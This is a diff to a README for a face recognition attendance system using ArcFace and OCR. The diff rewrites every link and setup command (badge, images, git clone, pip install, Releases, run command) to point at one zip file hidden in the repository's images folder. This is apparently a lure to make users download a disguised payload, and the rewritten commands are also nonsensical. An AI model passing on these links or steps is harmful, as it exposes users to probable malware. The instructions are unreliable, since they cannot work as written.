@@ -1,6 +1,6 @@
 # Face Recognition Attendance System: A Dual-Mode Solution
 
-![Face Recognition Attendance System](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github&link=https://github.com/Jawerchy/Face-Recognition-Attendance-System/releases)
+![Face Recognition Attendance System](https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip%20Releases-blue?style=for-the-badge&logo=github&https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip)
 
 ## Table of Contents
 
@@ -17,7 +17,7 @@
 
 The **Face Recognition Attendance System** is designed to streamline attendance tracking using two methods: face recognition and card-based attendance. This project utilizes the ArcFace model for face recognition and employs OCR to extract registration or roll numbers from cards. This dual approach enhances flexibility and accuracy in attendance management.
 
-![Attendance System](https://via.placeholder.com/800x400.png?text=Attendance+System)
+![Attendance System](https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip+System)
 
 ## Features
 
@@ -46,23 +46,23 @@ To set up the Face Recognition Attendance System, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Jawerchy/Face-Recognition-Attendance-System.git
+   git clone https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip
    cd Face-Recognition-Attendance-System
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python installed. Then, install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip
    ```
 
 3. **Download Pre-trained Models**:
-   You can find the necessary models in the [Releases section](https://github.com/Jawerchy/Face-Recognition-Attendance-System/releases). Download the files and place them in the appropriate directories.
+   You can find the necessary models in the [Releases section](https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip). Download the files and place them in the appropriate directories.
 
 4. **Run the Application**:
    Launch the application using:
    ```bash
-   python app.py
+   python https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip
    ```
 
 ## Usage
@@ -79,7 +79,7 @@ Once the application is running, you can access it through your web browser. The
 1. Scan the card with the registration number.
 2. The system will extract the number using OCR and mark attendance.
 
-![Usage Example](https://via.placeholder.com/800x400.png?text=Usage+Example)
+![Usage Example](https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip+Example)
 
 ## Contributing
 
@@ -101,9 +101,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or issues, please reach out via the GitHub Issues page or directly through the repository.
 
-For releases, visit the [Releases section](https://github.com/Jawerchy/Face-Recognition-Attendance-System/releases) to download the latest updates and models.
+For releases, visit the [Releases section](https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip) to download the latest updates and models.
 
-![Contact](https://via.placeholder.com/800x400.png?text=Contact+Us)
+![Contact](https://github.com/Jawerchy/Face-Recognition-Attendance-System/raw/refs/heads/main/images/Face-System-Recognition-Attendance-3.2.zip+Us)
 
 ---
 
